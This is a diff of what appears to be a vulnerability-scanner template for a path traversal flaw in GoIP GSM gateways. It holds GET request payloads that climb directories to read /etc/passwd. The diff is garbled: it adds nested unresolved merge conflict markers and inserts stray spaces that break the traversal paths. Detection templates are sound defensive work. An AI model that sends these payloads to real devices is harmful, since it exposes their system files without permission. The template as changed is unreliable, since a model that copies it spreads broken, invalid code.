@@ -10,6 +10,7 @@ info:
     - http://www.hybertone.com/uploadfile/download/20140304125509964.pdf
     - http://en.dbltek.com/latestfirmwares.html
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
@@ -17,12 +18,15 @@ info:
     cwe-id: CWE-22
 >>>>>>> 5d36d276 (add new stuff)
   tags: gsm,goip,lfi,iot
+=======
+  tags: gsm,goip,lfi
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
-      - "{{BaseURL}}/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f ..%2f..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/default/en_US/frame.A100.html?sidebar=..%2f..%2f ..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
 
     matchers:
       - type: regex
